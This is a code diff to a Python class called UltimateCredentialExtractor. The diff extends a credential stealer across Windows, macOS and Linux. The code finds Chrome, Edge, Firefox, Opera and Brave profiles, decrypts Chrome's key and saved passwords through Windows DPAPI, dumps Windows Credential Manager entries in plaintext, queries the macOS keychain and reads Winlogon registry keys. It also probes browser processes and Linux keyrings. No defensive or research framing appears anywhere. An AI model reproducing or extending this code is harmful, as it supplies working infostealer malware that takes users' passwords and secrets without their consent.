@@ -133,13 +133,29 @@ class UltimateCredentialExtractor:
         
         # Extract from ALL sources
         self.extract_browser_credentials_ultimate()
-        self.extract_windows_credman_ultimate()
-        self.extract_macos_keychain_ultimate()
+        
+        # Platform-specific credential manager extraction
+        self.extract_windows_credman_ultimate()  # This now handles all platforms
+        
+        # System credentials (platform-specific)
         self.extract_system_credentials_ultimate()
+        
+        # Network credentials
         self.extract_network_credentials_ultimate()
-        self.extract_registry_credentials_ultimate()
+        
+        # Registry/Keychain credentials (platform-specific)
+        if self.system == 'windows':
+            self.extract_registry_credentials_ultimate()
+        elif self.system == 'darwin':
+            self.extract_macos_keychain_ultimate()
+        
+        # Memory credentials
         self.extract_memory_credentials_ultimate()
+        
+        # Cache credentials
         self.extract_cache_credentials_ultimate()
+        
+        # Extension credentials
         self.extract_extension_credentials_ultimate()
         
         self.log("ULTIMATE credential extraction completed.")
@@ -161,19 +177,33 @@ class UltimateCredentialExtractor:
         self.log("Extracting Chrome credentials using ULTIMATE methods...")
         
         try:
-            # Chrome paths for different profiles
-            chrome_base_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data'),
-                os.path.expanduser('~/Library/Application Support/Google/Chrome')
-            ]
+            # Chrome paths for different platforms
+            chrome_base_paths = []
+            
+            if self.system == 'windows':
+                chrome_base_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data')
+                ]
+            elif self.system == 'darwin':  # macOS
+                chrome_base_paths = [
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome')
+                ]
+            else:  # Linux
+                chrome_base_paths = [
+                    os.path.expanduser('~/.config/google-chrome')
+                ]
             
             for base_path in chrome_base_paths:
                 if os.path.exists(base_path):
                     # Find all profiles
                     profiles = ['Default']
-                    for item in os.listdir(base_path):
-                        if item.startswith('Profile '):
-                            profiles.append(item)
+                    try:
+                        for item in os.listdir(base_path):
+                            if item.startswith('Profile ') or (item.startswith('Profile') and len(item) > 7 and item[7:].isdigit()):
+                                profiles.append(item)
+                    except PermissionError:
+                        self.log(f"Permission denied accessing {base_path}")
+                        continue
                     
                     for profile in profiles:
                         profile_path = os.path.join(base_path, profile)
@@ -434,12 +464,24 @@ class UltimateCredentialExtractor:
     def _get_chrome_encryption_key_ultimate(self):
         """Get Chrome encryption key using ULTIMATE methods"""
         try:
-            local_state_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
-                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'),
-                os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State'),
-                os.path.expanduser('~/Library/Application Support/Microsoft Edge/Local State')
-            ]
+            # Platform-specific paths
+            local_state_paths = []
+            
+            if self.system == 'windows':
+                local_state_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
+                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
+                ]
+            elif self.system == 'darwin':  # macOS
+                local_state_paths = [
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State'),
+                    os.path.expanduser('~/Library/Application Support/Microsoft Edge/Local State')
+                ]
+            else:  # Linux
+                local_state_paths = [
+                    os.path.expanduser('~/.config/google-chrome/Local State'),
+                    os.path.expanduser('~/.config/microsoft-edge/Local State')
+                ]
             
             for local_state_path in local_state_paths:
                 if os.path.exists(local_state_path):
@@ -447,14 +489,25 @@ class UltimateCredentialExtractor:
                         local_state = json.load(f)
                         
                     if 'os_crypt' in local_state:
-                        encrypted_key = local_state['os_crypt']['encrypted_key']
-                        encrypted_key = base64.b64decode(encrypted_key)
-                        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
-                        
-                        # Decrypt using DPAPI
-                        if WINDOWS_MODULES_AVAILABLE:
-                            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                            return decrypted_key
+                        encrypted_key = local_state['os_crypt'].get('encrypted_key') or local_state['os_crypt'].get('app_bound_encrypted_key')
+                        if encrypted_key:
+                            encrypted_key = base64.b64decode(encrypted_key)
+                            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+                            
+                            # Decrypt based on platform
+                            if self.system == 'windows' and WINDOWS_MODULES_AVAILABLE:
+                                # Windows: Use DPAPI
+                                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                                return decrypted_key
+                            elif self.system == 'darwin':
+                                # macOS: Use Keychain (placeholder - needs proper implementation)
+                                # For now, return encrypted key as-is
+                                return encrypted_key
+                            else:
+                                # Linux: Use keyring (placeholder - needs proper implementation)
+                                if KEYRING_AVAILABLE:
+                                    return encrypted_key
+                                return encrypted_key
                             
         except Exception as e:
             self.log(f"Error getting Chrome encryption key: {e}")
@@ -551,7 +604,7 @@ class UltimateCredentialExtractor:
     def _decrypt_dpapi_ultimate(self, encrypted_password, key):
         """Decrypt using Windows DPAPI with ULTIMATE methods"""
         try:
-            if not WINDOWS_MODULES_AVAILABLE:
+            if self.system != 'windows' or not WINDOWS_MODULES_AVAILABLE:
                 return '[ENCRYPTED]'
                 
             decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
@@ -675,12 +728,24 @@ class UltimateCredentialExtractor:
         self.log("Extracting Firefox credentials using ULTIMATE methods...")
         
         try:
-            firefox_paths = [
-                os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
-                os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles'),
-                os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
-                os.path.expanduser('~/Library/Mozilla/Firefox/Profiles')
-            ]
+            # Platform-specific Firefox paths
+            firefox_paths = []
+            
+            if self.system == 'windows':
+                firefox_paths = [
+                    os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
+                    os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles')
+                ]
+            elif self.system == 'darwin':  # macOS
+                firefox_paths = [
+                    os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
+                    os.path.expanduser('~/Library/Mozilla/Firefox/Profiles')
+                ]
+            else:  # Linux
+                firefox_paths = [
+                    os.path.expanduser('~/.mozilla/firefox'),
+                    os.path.expanduser('~/.firefox')
+                ]
             
             for profiles_path in firefox_paths:
                 if os.path.exists(profiles_path):
@@ -895,18 +960,33 @@ class UltimateCredentialExtractor:
         self.log("Extracting Edge credentials using ULTIMATE methods...")
         
         try:
-            edge_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data'),
-                os.path.expanduser('~/Library/Application Support/Microsoft Edge')
-            ]
+            # Platform-specific Edge paths
+            edge_paths = []
+            
+            if self.system == 'windows':
+                edge_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data')
+                ]
+            elif self.system == 'darwin':  # macOS
+                edge_paths = [
+                    os.path.expanduser('~/Library/Application Support/Microsoft Edge')
+                ]
+            else:  # Linux
+                edge_paths = [
+                    os.path.expanduser('~/.config/microsoft-edge')
+                ]
             
             for base_path in edge_paths:
                 if os.path.exists(base_path):
                     # Find all profiles
                     profiles = ['Default']
-                    for item in os.listdir(base_path):
-                        if item.startswith('Profile '):
-                            profiles.append(item)
+                    try:
+                        for item in os.listdir(base_path):
+                            if item.startswith('Profile ') or (item.startswith('Profile') and len(item) > 7 and item[7:].isdigit()):
+                                profiles.append(item)
+                    except PermissionError:
+                        self.log(f"Permission denied accessing {base_path}")
+                        continue
                     
                     for profile in profiles:
                         profile_path = os.path.join(base_path, profile)
@@ -921,10 +1001,21 @@ class UltimateCredentialExtractor:
         self.log("Extracting Opera credentials using ULTIMATE methods...")
         
         try:
-            opera_paths = [
-                os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable'),
-                os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera')
-            ]
+            # Platform-specific Opera paths
+            opera_paths = []
+            
+            if self.system == 'windows':
+                opera_paths = [
+                    os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable')
+                ]
+            elif self.system == 'darwin':  # macOS
+                opera_paths = [
+                    os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera')
+                ]
+            else:  # Linux
+                opera_paths = [
+                    os.path.expanduser('~/.config/opera')
+                ]
             
             for base_path in opera_paths:
                 if os.path.exists(base_path):
@@ -961,38 +1052,47 @@ class UltimateCredentialExtractor:
             self.log(f"Error extracting Brave credentials: {e}")
             
     def extract_windows_credman_ultimate(self):
-        """ULTIMATE Windows Credential Manager extraction"""
-        self.log("Extracting Windows Credential Manager using ULTIMATE methods...")
-        
-        try:
-            if WINDOWS_MODULES_AVAILABLE:
-                # Method 1: Windows Credential Manager API
-                creds = win32cred.CredEnumerate()
-                for cred in creds:
-                    target = cred['TargetName']
-                    username = cred['UserName']
-                    password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else '[ENCRYPTED]'
-                    
-                    self.extracted_credentials['windows_credman'].append({
-                        'type': 'windows_credman_api',
-                        'target': target,
-                        'username': username,
-                        'password': password,
-                        'credential_type': cred['Type'],
-                        'persist': cred['Persist']
-                    })
+        """ULTIMATE System Credential Manager extraction (cross-platform)"""
+        if self.system == 'windows':
+            self.log("Extracting Windows Credential Manager using ULTIMATE methods...")
             
-            # Method 2: PowerShell extraction
-            self._extract_windows_powershell_ultimate()
-            
-            # Method 3: Registry extraction
-            self._extract_windows_registry_ultimate()
-            
-            # Method 4: Keyring extraction
-            self._extract_windows_keyring_ultimate()
-            
-        except Exception as e:
-            self.log(f"Error extracting Windows CredMan: {e}")
+            try:
+                if WINDOWS_MODULES_AVAILABLE:
+                    # Method 1: Windows Credential Manager API
+                    creds = win32cred.CredEnumerate()
+                    for cred in creds:
+                        target = cred['TargetName']
+                        username = cred['UserName']
+                        password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else '[ENCRYPTED]'
+                        
+                        self.extracted_credentials['windows_credman'].append({
+                            'type': 'windows_credman_api',
+                            'target': target,
+                            'username': username,
+                            'password': password,
+                            'credential_type': cred['Type'],
+                            'persist': cred['Persist']
+                        })
+                
+                # Method 2: PowerShell extraction
+                self._extract_windows_powershell_ultimate()
+                
+                # Method 3: Registry extraction
+                self._extract_windows_registry_ultimate()
+                
+                # Method 4: Keyring extraction
+                self._extract_windows_keyring_ultimate()
+                
+            except Exception as e:
+                self.log(f"Error extracting Windows CredMan: {e}")
+        elif self.system == 'darwin':
+            # macOS Keychain extraction
+            self.log("Extracting macOS Keychain using ULTIMATE methods...")
+            self._extract_macos_keychain_helper()
+        else:
+            # Linux keyring extraction
+            self.log("Extracting Linux keyring using ULTIMATE methods...")
+            self._extract_linux_keyring_helper()
             
     def _extract_windows_powershell_ultimate(self):
         """ULTIMATE PowerShell credential extraction"""
@@ -1062,8 +1162,12 @@ class UltimateCredentialExtractor:
             self.log(f"Error extracting Windows PowerShell credentials: {e}")
             
     def _extract_windows_registry_ultimate(self):
-        """ULTIMATE Windows Registry credential extraction"""
+        """ULTIMATE Windows Registry credential extraction (Windows only)"""
+        if self.system != 'windows':
+            return
+            
         try:
+            import winreg
             registry_paths = [
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
                 r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
@@ -1106,13 +1210,16 @@ class UltimateCredentialExtractor:
                             'value': str(value)
                         })
                     i += 1
-                except WindowsError:
+                except (WindowsError, OSError):
                     break
         except Exception as e:
             self.log(f"Error reading registry key: {e}")
             
     def _extract_windows_keyring_ultimate(self):
-        """Extract Windows Keyring credentials"""
+        """Extract Windows Keyring credentials (Windows only)"""
+        if self.system != 'windows':
+            return
+            
         try:
             if KEYRING_AVAILABLE:
                 # Get all keyring entries
@@ -1133,23 +1240,75 @@ class UltimateCredentialExtractor:
         except Exception as e:
             self.log(f"Error extracting Windows Keyring: {e}")
             
+    def _extract_macos_keychain_helper(self):
+        """Helper method for macOS Keychain extraction"""
+        if self.system != 'darwin':
+            return
+            
+        try:
+            # Method 1: Security command
+            self._extract_macos_security_command()
+            
+            # Method 2: Keyring library
+            self._extract_macos_keyring_library()
+            
+            # Method 3: Keychain files
+            self._extract_macos_keychain_files()
+            
+        except Exception as e:
+            self.log(f"Error extracting macOS Keychain: {e}")
+    
     def extract_macos_keychain_ultimate(self):
         """ULTIMATE macOS Keychain extraction"""
         self.log("Extracting macOS Keychain using ULTIMATE methods...")
-        
+        self._extract_macos_keychain_helper()
+    
+    def _extract_linux_keyring_helper(self):
+        """Helper method for Linux keyring extraction"""
+        if self.system == 'windows' or self.system == 'darwin':
+            return
+            
         try:
-            if self.system == 'darwin':
-                # Method 1: Security command
-                self._extract_macos_security_command()
+            if KEYRING_AVAILABLE:
+                # Try to get keyring backends
+                import keyring.backends
+                backends = keyring.get_keyring()
                 
-                # Method 2: Keyring library
-                self._extract_macos_keyring_library()
+                self.extracted_credentials['windows_credman'].append({
+                    'type': 'linux_keyring',
+                    'backend': str(type(backends).__name__),
+                    'note': 'Keyring backend detected'
+                })
                 
-                # Method 3: Keychain files
-                self._extract_macos_keychain_files()
+                # Try to list services (if supported)
+                try:
+                    # Some keyring backends support listing
+                    services = []
+                    # This is backend-specific, so we try common ones
+                    if hasattr(backends, 'get_preferred_collection'):
+                        self.extracted_credentials['windows_credman'].append({
+                            'type': 'linux_keyring_collection',
+                            'note': 'Keyring collection accessible'
+                        })
+                except:
+                    pass
+            else:
+                # Try to access keyring files directly
+                keyring_paths = [
+                    os.path.expanduser('~/.local/share/keyrings'),
+                    os.path.expanduser('~/.gnome2/keyrings'),
+                ]
                 
+                for keyring_path in keyring_paths:
+                    if os.path.exists(keyring_path):
+                        self.extracted_credentials['windows_credman'].append({
+                            'type': 'linux_keyring_file',
+                            'path': keyring_path,
+                            'note': 'Keyring directory found'
+                        })
+                        
         except Exception as e:
-            self.log(f"Error extracting macOS Keychain: {e}")
+            self.log(f"Error extracting Linux keyring: {e}")
             
     def _extract_macos_security_command(self):
         """Extract macOS Keychain using security command"""
@@ -1173,6 +1332,8 @@ class UltimateCredentialExtractor:
                         current_entry['service'] = line.split(':')[1].strip()
                 
                 if current_entry:
+                    if 'macos_keychain' not in self.extracted_credentials:
+                        self.extracted_credentials['macos_keychain'] = []
                     self.extracted_credentials['macos_keychain'].append(current_entry)
                     
         except Exception as e:
@@ -1188,6 +1349,8 @@ class UltimateCredentialExtractor:
                 
                 for backend in backends:
                     try:
+                        if 'macos_keychain' not in self.extracted_credentials:
+                            self.extracted_credentials['macos_keychain'] = []
                         self.extracted_credentials['macos_keychain'].append({
                             'type': 'keyring_backend',
                             'backend': str(backend),
@@ -1211,6 +1374,8 @@ class UltimateCredentialExtractor:
             
             for keychain_path in keychain_paths:
                 if os.path.exists(keychain_path):
+                    if 'macos_keychain' not in self.extracted_credentials:
+                        self.extracted_credentials['macos_keychain'] = []
                     self.extracted_credentials['macos_keychain'].append({
                         'type': 'keychain_file',
                         'path': keychain_path,
@@ -1229,8 +1394,56 @@ class UltimateCredentialExtractor:
         elif self.system == 'darwin':
             self._extract_macos_system_credentials_ultimate()
             
+    def _extract_macos_system_credentials_ultimate(self):
+        """ULTIMATE macOS system credential extraction"""
+        if self.system != 'darwin':
+            return
+            
+        try:
+            # Extract from macOS sources
+            self._extract_macos_network_credentials()
+            self._extract_macos_memory_credentials()
+            
+        except Exception as e:
+            self.log(f"Error extracting macOS system credentials: {e}")
+    
+    def _extract_macos_network_credentials(self):
+        """Extract macOS network credentials"""
+        try:
+            # Check for stored network passwords
+            result = subprocess.run(['security', 'find-internet-password'], 
+                                  capture_output=True, text=True, timeout=30)
+            if result.returncode == 0:
+                self.extracted_credentials['network_credentials'].append({
+                    'type': 'macos_network',
+                    'note': 'Network passwords found in keychain'
+                })
+        except Exception as e:
+            self.log(f"Error extracting macOS network credentials: {e}")
+    
+    def _extract_macos_memory_credentials(self):
+        """Extract macOS memory credentials"""
+        try:
+            if PSUTIL_AVAILABLE:
+                for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
+                    try:
+                        if any(browser in proc.info['name'].lower() for browser in ['chrome', 'firefox', 'safari', 'opera', 'brave']):
+                            self.extracted_credentials['memory_credentials'].append({
+                                'type': 'process_memory',
+                                'process': proc.info['name'],
+                                'pid': proc.info['pid'],
+                                'note': 'Browser process found - memory extraction requires additional tools'
+                            })
+                    except:
+                        continue
+        except Exception as e:
+            self.log(f"Error extracting macOS memory credentials: {e}")
+    
     def _extract_windows_system_credentials_ultimate(self):
-        """ULTIMATE Windows system credential extraction"""
+        """ULTIMATE Windows system credential extraction (Windows only)"""
+        if self.system != 'windows':
+            return
+            
         try:
             # Extract from various Windows sources
             self._extract_windows_network_credentials()
@@ -1241,7 +1454,10 @@ class UltimateCredentialExtractor:
             self.log(f"Error extracting Windows system credentials: {e}")
             
     def _extract_windows_network_credentials(self):
-        """Extract Windows network credentials"""
+        """Extract Windows network credentials (Windows only)"""
+        if self.system != 'windows':
+            return
+            
         try:
             if WINDOWS_MODULES_AVAILABLE:
                 # Get network credentials
@@ -1261,7 +1477,10 @@ class UltimateCredentialExtractor:
             self.log(f"Error extracting Windows network credentials: {e}")
             
     def _extract_windows_memory_credentials(self):
-        """Extract Windows memory credentials"""
+        """Extract Windows memory credentials (Windows only)"""
+        if self.system != 'windows':
+            return
+            
         try:
             if PSUTIL_AVAILABLE:
                 for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
@@ -1280,7 +1499,10 @@ class UltimateCredentialExtractor:
             self.log(f"Error extracting Windows memory credentials: {e}")
             
     def _extract_windows_service_credentials(self):
-        """Extract Windows service credentials"""
+        """Extract Windows service credentials (Windows only)"""
+        if self.system != 'windows':
+            return
+            
         try:
             if WINDOWS_MODULES_AVAILABLE:
                 # Get service credentials
@@ -1299,6 +1521,9 @@ class UltimateCredentialExtractor:
             
     def _extract_macos_system_credentials_ultimate(self):
         """ULTIMATE macOS system credential extraction"""
+        if self.system != 'darwin':
+            return
+            
         try:
             # Extract from various macOS sources
             self._extract_macos_network_credentials()
@@ -1306,25 +1531,6 @@ class UltimateCredentialExtractor:
             
         except Exception as e:
             self.log(f"Error extracting macOS system credentials: {e}")
-            
-    def _extract_macos_network_credentials(self):
-        """Extract macOS network credentials"""
-        try:
-            # Get network credentials
-            result = subprocess.run(['security', 'find-internet-password'], 
-                                  capture_output=True, text=True, timeout=30)
-            if result.returncode == 0:
-                lines = result.stdout.strip().split('\n')
-                for line in lines:
-                    if 'server:' in line.lower():
-                        server = line.split(':')[1].strip()
-                        self.extracted_credentials['network_credentials'].append({
-                            'type': 'network_credential',
-                            'server': server
-                        })
-                        
-        except Exception as e:
-            self.log(f"Error extracting macOS network credentials: {e}")
             
     def _extract_macos_memory_credentials(self):
         """Extract macOS memory credentials"""
@@ -1374,11 +1580,23 @@ class UltimateCredentialExtractor:
         self.log("Extracting extension credentials using ULTIMATE methods...")
         
         try:
-            # Chrome extensions
-            chrome_extensions_paths = [
-                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions'),
-                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Extensions')
-            ]
+            # Chrome extensions - platform-specific paths
+            chrome_extensions_paths = []
+            if self.system == 'windows':
+                chrome_extensions_paths = [
+                    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions'),
+                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions')
+                ]
+            elif self.system == 'darwin':  # macOS
+                chrome_extensions_paths = [
+                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Extensions'),
+                    os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/Extensions')
+                ]
+            else:  # Linux
+                chrome_extensions_paths = [
+                    os.path.expanduser('~/.config/google-chrome/Default/Extensions'),
+                    os.path.expanduser('~/.config/microsoft-edge/Default/Extensions')
+                ]
             
             for extensions_path in chrome_extensions_paths:
                 if os.path.exists(extensions_path):
